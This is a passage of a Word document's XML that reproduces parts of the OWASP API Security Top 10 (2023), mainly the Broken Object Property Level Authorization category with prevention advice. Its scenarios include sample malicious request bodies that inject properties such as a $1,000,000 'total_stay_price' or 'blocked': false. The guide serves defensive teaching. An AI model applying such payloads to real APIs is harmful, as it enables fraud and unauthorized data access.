    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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API keys should not be used for user authentication. They should only be used for </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">API </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>clients</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> authentication.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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API3:2023 Broken Object Property Level Authorization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981"/>
        <w:gridCol w:w="4264"/>
        <w:gridCol w:w="3875"/>
      </w:tblGrid>
      <w:tr w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidTr="00094B5B">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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094B5B" w:rsidRPr="00790A44" w:rsidTr="00094B5B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Common</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Moderate</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidTr="00094B5B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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APIs tend to expose endpoints that return all object’s properties. This is particularly valid for REST APIs. For other protocols such as </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>GraphQL</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>, it may require crafted requests to specify which properties should be returned. Identifying these additional properties that can be manipulated requires more effort, but there are a few automated tools available to assist in this task.</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Inspecting API responses is enough to identify sensitive information in returned objects’ representations. Fuzzing is usually used to identify additional (hidden) properties. Whether they can be changed is a matter of crafting an API request and analyzing the response. Side-effect analysis may be required if the target property is not returned in the API response.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
            <w:pPr>
              <w:jc w:val="lowKashida"/>
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Unauthorized access to private/sensitive object properties may result in data disclosure, data loss, or data corruption. Under certain circumstances, unauthorized access to object properties can lead to privilege escalation or partial/full account takeover.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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When allowing a user to access an object using an API endpoint, it is important to validate that the user has access to the specific object properties they are trying to access.</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endpoint is vulnerable if:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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API endpoint exposes properties of an object that are considered sensitive and should not be read by the user. (previously named: "</w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Excessive Data Exposure</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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API endpoint allows a user to change, add/or delete the value of a sensitive object's property which the user should not be able to access (previously named: "</w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Mass Assignment</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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dating app allows a user to report other users for inappropriate behavior. As part of this flow, the user clicks on a "report" button, and the following API call is triggered:</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graphql</w:t>
      </w:r>
      <w:proofErr w:type="spell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operationName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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reportUser</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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variables</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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userId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": 313,</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reason</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":["offensive behavior"]</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query</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":"mutation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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reportUser</w:t>
      </w:r>
      <w:proofErr w:type="spell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userId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: ID!, $reason: String!)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reportUser</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>userId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>userId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, reason: $reason)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status</w:t>
      </w:r>
      <w:proofErr w:type="gram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message</w:t>
      </w:r>
      <w:proofErr w:type="gram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reportedUser</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">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id</w:t>
      </w:r>
      <w:proofErr w:type="gram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fullName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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recentLocation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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API Endpoint is vulnerable since it allows the authenticated user to have access to sensitive (reported) user object properties, such as "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>fullName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>" and "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>recentLocation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>" that are not supposed to be accessed by other users.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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lastRenderedPageBreak/>
        <w:t>Scenario #2</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online marketplace platform, that offers one type of users ("hosts") to rent out their apartment to another type of users ("guests"), requires the host to accept a booking made by a guest, before charging the guest for the stay.</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As part of this flow, an API call is sent by the host to </w:t>
      </w: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api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/host/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>approve_booking</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> with the following legitimate payload:</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approved</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": true,</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comment</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "Check-in is after 3pm"</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host replays the legitimate request, and adds the following malicious payload:</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approved</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": true,</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comment</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "Check-in is after 3pm",</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total_stay_price</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "$1,000,000"</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API endpoint is vulnerable because there is no validation that the host should have access to the internal object property - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>total_stay_price</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, and the guest will be charged more than she was supposed to be.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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#3</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social network that is based on short videos, enforces restrictive content filtering and censorship. Even if an uploaded video is blocked, the user can change the description of the video using the following API request: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PUT /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/video/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>update_video</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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description</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "a funny video about cats"</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frustrated user can replay the legitimate request, and add the following malicious payload:</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description</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "a funny video about cats",</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blocked</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": false</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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lastRenderedPageBreak/>
        <w:t>The API endpoint is vulnerable because there is no validation if the user should have access to the internal object property - </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>blocked</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, and the user can change the value from </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> to </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> and unlock their own blocked content.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B"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094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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When exposing an object using an API endpoint, always make sure that the user should have access to the object's properties you expose.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Avoid using generic methods such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to_string</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Instead, cherry-pick specific object properties you specifically want to return.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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If possible, avoid using functions that automatically bind a client's input into code variables, internal objects, or object properties ("Mass Assignment").</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Allow changes only to the object's properties that should be updated by the client.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Implement a schema-based response validation mechanism as an extra layer of security. As part of this mechanism, define and enforce data returned by all API methods.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00094B5B" w:rsidRPr="00790A44" w:rsidRDefault="00094B5B" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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Keep returned data structures to the bare minimum, according to the business/functional requirements for the endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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API4:2023 Unrestricted Resource Consumption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4140"/>
        <w:gridCol w:w="4579"/>
        <w:gridCol w:w="3401"/>
      </w:tblGrid>
      <w:tr w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidTr="00933883">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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933883" w:rsidRPr="00790A44" w:rsidTr="00933883">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Average</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Widespread</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Severe</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidTr="00933883">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Exploitation requires simple API requests. Multiple concurrent requests can be performed from a single local computer or by using cloud computing resources. Most of the automated tools available are designed to cause </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
